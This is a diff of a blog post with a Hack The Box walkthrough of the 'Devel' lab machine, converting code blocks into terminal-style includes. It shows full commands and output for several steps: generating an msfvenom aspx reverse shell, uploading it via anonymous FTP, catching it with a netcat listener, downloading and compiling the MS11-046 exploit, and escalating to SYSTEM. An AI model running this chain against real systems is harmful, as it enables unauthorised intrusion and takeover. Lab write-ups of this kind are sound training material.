@@ -27,8 +27,7 @@ Lazy devs make for easy boxes.  Welcome to Devel.
 
 Run nmap to discover the ports running on the server.  Notice that anonymous login is allowed on the FTP.  Further, the directory listing looks like the root folder of the website.  Neat.
 
-{% raw %}
-```sh
+{% capture nmap %}
 └──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.5
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 07:18 CST
 Nmap scan report for 10.10.10.5
@@ -42,8 +41,12 @@ PORT   STATE SERVICE VERSION
 |_03-17-17  04:37PM               184946 welcome.png
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Generate an aspx msfvenom payload.
@@ -56,8 +59,7 @@ Generate an aspx msfvenom payload.
 <li>-o The name of the file that the file will be called</li>
 </ul>
 
-{% raw %}
-```sh
+{% capture generatepayload %}
 └──╼ [★]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f aspx -o rev.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -65,14 +67,17 @@ No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of aspx file: 2713 bytes
 Saved as: rev.aspx
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=generatepayload %}
 
 <br />
 Use the ftp service with the anonymous account and transfer the exploit file to victim machine.
 
-{% raw %}
-```sh
+{% capture connectftp %}
 └──╼ [★]$ ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -88,18 +93,25 @@ local: rev.aspx remote: rev.aspx
 100% |*************************************************************************************************************************************************|  2751       13.73 MiB/s    --:-- ETA
 226 Transfer complete.
 2751 bytes sent in 00:00 (27.34 KiB/s)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=connectftp %}
 
 <br />
 Start a listener listening on the LPORT that was chosen in the msfvenom exploit.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 └──╼ [★]$ sudo nc -nlvp 443
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 In the web browser, navigate to the aspx that we just transfer.
@@ -113,34 +125,47 @@ In the web browser, navigate to the aspx that we just transfer.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 └──╼ [★]$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.29] from (UNKNOWN) [10.10.10.5] 49161
+{% endcapture %}
+
+{% capture windowsshell %}
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 c:\windows\system32\inetsrv>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=windowsshell %}
 
 <br />
 Run whoami just to test the command execution and see who we are.
 
-{% raw %}
-```sh
+{% capture firstwhoami %}
 c:\windows\system32\inetsrv>whoami
 whoami
 iis apppool\web
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=firstwhoami %}
 
 <br />
 Run systeminfo to get a sense of the system that we are on.
 
-{% raw %}
-```sh
+{% capture systeminfo %}
 c:\windows\system32\inetsrv>systeminfo
 systeminfo
 
@@ -185,8 +210,12 @@ Network Card(s):           1 NIC(s) Installed.
                                  [02]: fe80::c83:f455:7b23:2631
                                  [03]: dead:beef::b8f4:f25d:3375:9e52
                                  [04]: dead:beef::c83:f455:7b23:2631
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=systeminfo %}
 
 <br />
 This version of Windows if vulnerable to MS11-046.  Read up on the vulnerability.
@@ -211,8 +240,7 @@ Perform further research to find an exploit for this particular vulnerability.
 <br />
 Download the exploit into the local working folder.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/devel]
 └─$ wget https://www.exploit-db.com/raw/40564 -O MS11-046.c                                 
 --2025-01-18 22:56:53--  https://www.exploit-db.com/raw/40564
@@ -225,28 +253,34 @@ Saving to: ‘MS11-046.c’
 MS11-046.c                                                     [  <=>                                                                                                                                    ]  31.91K   112KB/s    in 0.3s    
 
 2025-01-18 22:56:54 (112 KB/s) - ‘MS11-046.c’ saved [32674]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadexploit %}
 
 <br />
 Cross-compile the exploit for the Windows machine.
 
-{% raw %}
-```sh
+{% capture crosscompile %}
 ┌──(kali㉿kali)-[~/Documents/htb/devel]
 └─$ i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/htb/devel]
 └─$ ls
 MS11-046.c  MS11-046.exe
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=crosscompile %}
 
 <br />
 Log into the FTP server and change into binary mode.
 
-{% raw %}
-```sh
+{% capture connectftp %}
 └──╼ [★]$ ftp 10.10.10.5
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -257,8 +291,12 @@ Password:
 Remote system type is Windows_NT.
 ftp> binary
 200 Type set to I.
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=connectftp %}
 
 <br />
 Microsoft recommends binary mode for sending executables.
@@ -273,8 +311,7 @@ Microsoft recommends binary mode for sending executables.
 <br />
 Put the MS11-046.exe binary executable onto the victim server.
 
-{% raw %}
-```sh
+{% capture ftpexploit %}
 ftp> put MS11-046.exe
 local: MS11-046.exe remote: MS11-046.exe
 229 Entering Extended Passive Mode (|||49159|)
@@ -282,16 +319,19 @@ local: MS11-046.exe remote: MS11-046.exe
 100% |*************************************************************************************************************************************************|   234 KiB  340.43 KiB/s    00:00 ETA
 226 Transfer complete.
 240005 bytes sent in 00:00 (297.90 KiB/s)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ftpexploit %}
 
 <br />
 
 <br />
 Navigate to the webroot and execute the binary.
 
-{% raw %}
-```sh
+{% capture runms11046 %}
 C:\inetpub\wwwroot>dir
 dir
  Volume in drive C has no label.
@@ -311,25 +351,31 @@ dir
 
 C:\inetpub\wwwroot>MS11-046.exe
 MS11-046.exe
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=runms11046 %}
 
 <br />
 Run whoami to confirm that we are SYSTEM.
 
-{% raw %}
-```sh
+{% capture systemwhoami %}
 c:\Windows\System32>whoami
 whoami
 nt authority\system
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=systemwhoami %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 C:\Users\babis\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -355,14 +401,17 @@ Tunnel adapter isatap.{0B2931D6-69F8-4A00-8E64-237C531D469C}:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 <redracted>
@@ -388,8 +437,12 @@ Tunnel adapter isatap.{0B2931D6-69F8-4A00-8E64-237C531D469C}:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=rootflag %}
 
 <br />
 I look forward to seeing you in the next one.
